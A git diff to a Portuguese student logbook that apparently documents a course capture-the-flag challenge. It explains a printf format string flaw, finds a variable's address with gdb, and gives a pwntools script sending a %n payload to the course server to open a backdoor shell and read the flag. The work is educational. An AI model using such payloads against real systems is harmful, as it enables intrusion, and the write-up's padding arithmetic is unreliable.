@@ -288,7 +288,7 @@ Com isto, conseguimos alterar o valor da variável target para 0x5000, como se p
 
 >Qual é a linha do código onde a vulnerabilidade se encontra?
 <p>
-A vulnerabilidade encontra-se na linha 25 quando se executa 'printf(buffer)'. Quando se passa informação diretamente para o 'printf()' sem utilizar uma 'format string', é possível utilizar 'format specifiers' como %s e %x para ler ou escrever em localizações de memória.
+A vulnerabilidade encontra-se na linha 27 quando se executa 'printf(buffer)'. Quando se passa informação diretamente para o 'printf()' sem utilizar uma 'format string', é possível utilizar 'format specifiers' como %s e %x para ler ou escrever em localizações de memória.
 </p>
 
 >O que é que a vulnerabilidade permite fazer?
@@ -379,3 +379,103 @@ Executando o script, conseguimos obter a flag:
 
 ![Flag](uploads/logbook7P10.png)
 
+## Desaio 2
+
+>Análise do 'checksec'
+
+![checksec](uploads/logbook7P11.png)
+
+- No RELRO: Isto significa que a medidad de segurança RELRO não está ativa, o que permite que certas secções possam ser alteradas, mesmo que seja para apontar para uma localização de memória que não esteja protegida.
+
+- Canary Found: Esta medida de segurança implica a presença de um "canário" (variável de controlo do fluxo) inserido na stack antes do endereço de retorno de uma função. Se essa variável for modificada, o programa será encerrado como uma medida de segurança contra tentativas de 'buffer overflow'.
+
+- NX Enabled: Esta medida de segurança marca certas áreas de memória como não executáveis, o que impede que código malicioso seja executado a partir dessas áreas.
+
+- No PIE: Considerado que o PIE está desativado, o endereço de memória das funções não é aleatório, o que facilita a exploração de vulnerabilidades.
+
+- Tipos de ataques possíveis:
+  - Format String Attack;
+
+<br>
+
+
+<div align="justify">
+
+>Qual é a linha do código onde a vulnerabilidade se encontra? E o que é que a vulnerabilidade permite fazer?
+<p>
+A vulnerabilidade encontra-se na linha 14 quando se executa 'printf(buffer)'. Quando se passa informação diretamente para o 'printf()' sem utilizar uma 'format string', é possível utilizar 'format specifiers' como %s e %x para ler ou escrever em localizações de memória.
+</p>
+
+>O que é que a vulnerabilidade permite fazer?
+<p>
+A vulnerabilidade permite que um atacante leia ou escreva na memória fornecendo especificadores de formato (`%s`, `%x`, `%n`, etc.) na string de entrada. Por exemplo, um atacante poderia potencialmente modificar a variável `key` para ativar a "backdoor", levando à execução arbitrária de código.
+</p>
+
+>Qual é a funcionalidade que te permite obter a flag?
+<p>
+De forma a obter a flag, podemos utilizar os 'format specifiers' mencionados na resposta a pergunta anterior de forma alterar o valor da variável 'key' para 0xbeef e assim ativar a "backdoor".
+</p>
+
+>Obtenção da flag
+<p>
+De forma a obtermos a flag, pensamos primeiramente em encontrar o endereço da variável 'key'. Para tal, corremos o programa com o gdb. Assim, conseguimos encontrar o endereço da variável 'key' que é: 0x804b320.
+</p>
+
+```bash
+(gdb) b fflush
+Breakpoint 1 at 0x80490c0
+(gdb) run
+Starting program: /mnt/c/Users/tomas/OneDrive/Uni Shared/3o ano/1o semestre/FSI/Semana7-Desafio2/program
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0xf7df6a58 in fflush () from /lib32/libc.so.6
+(gdb) p &key
+$1 = (int *) 0x804b320 <key>
+(gdb)
+```
+
+<p>
+Após isso, fomos verificar quantos %x precisariamos de utilizar para encontrarmos o conteúdo do nosso input. Tal como aconteceu no desafio anterior, verificamos que se encontrava logo no primeiro %x.
+</p>
+
+<p>
+Sendo assim, sabiamos que no nosso input teriamos que incluir o valor do endereço da variável 'key' seguido de 1 %n para alterar o seu valor. Os problemas durgiram quando verificamos que necessitavamos de imprimir 0xbeef = 48879 bytes de forma a alterar o valor da variável key e que como a máquina é little endian, o valor que temos que imprimir do endereço de memória é \x20\xb3\x04\x08 e o \x20\ é um caracter especial que não pode ser impresso. Assim, tivemos que encontrar uma forma de imprimir o valor do endereço de memória sem imprimir o \x20\.
+</p>
+
+<p>
+Decidimos entao ajustar o endereço de memória que íamos usar no input para o endereço anterior (input_address = 0x804b320 - 1). Com essa alteração, ao considerarmos o endereço = 0x804b320, precisaríamos escrever 48879 bytes. No entanto, com o endereço = 0x804b31F, precisariamos de escrever 48879 * 256 = 12499968 bytes. Isso deve se ao facto de que há 256 possíveis valores para cada byte. Ao escrever 256 bytes adicionais, podemos ultrapassar o endereço de memória de 0x804b31F para 0x804b320, possibilitando a modificação do valor da variável 'key'. Assim, o nosso script foi o seguinte:
+</p>
+
+</div>
+
+```python
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    pause()
+else:
+    p = remote("ctf-fsi.fe.up.pt", 4005)
+
+input_address = 0x804b320 - 1
+address_bytes = input_address.to_bytes(4, byteorder='little')
+
+# Calculate padding needed to write 0xbeef
+padding = 0xbeef * 256 - 4
+difference = input_address - 0x804b320
+
+payload = address_bytes + b"%"+str(padding).encode()+b"c"+b"%1$n"
+
+p.sendline(payload)
+p.interactive()
+```
+
+<p>
+Com estas medidas, conseguimos portanto alterar o valor da variável 'key' para 0xbeef e assim ativar a "backdoor", o que nos dá acesso a uma bash, onde conseguimos obter a flag, lendo o conteúdo do ficheiro 'flag.txt'.
+</p>
+
+![](uploads/logbook7P13.png)
+![](uploads/logbook7P14.png)
